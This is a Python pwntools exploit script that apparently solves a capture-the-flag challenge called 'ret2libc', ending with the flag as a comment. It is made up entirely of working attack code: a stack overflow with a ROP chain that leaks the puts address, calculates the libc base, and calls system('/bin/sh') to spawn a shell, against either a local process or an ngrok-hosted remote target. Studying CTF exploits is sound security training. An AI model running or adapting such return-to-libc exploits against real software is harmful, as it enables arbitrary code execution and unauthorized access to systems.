#!/usr/bin/python3

from pwn import *

exe = ELF('ret2libc', checksec=False)
libc = ELF('libc6_2.35-0ubuntu3.1_amd64.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('0.tcp.ap.ngrok.io', 11512)
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x00000000004011be
ret = 0x000000000040101a
payload = b"a" * 88 + flat(
        pop_rdi, exe.got['puts'], exe.plt['puts'],
        exe.sym['main']
)
sla(b"bone", payload)

p.recvuntil(b"results:\n")
libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))

payload = b"a" * 88 + flat(
        ret, 
        pop_rdi, next(libc.search(b"/bin/sh")), libc.sym['system']
)
sla(b"bone", payload)
p.interactive()
# babyshark{ret2libc-too-easy}
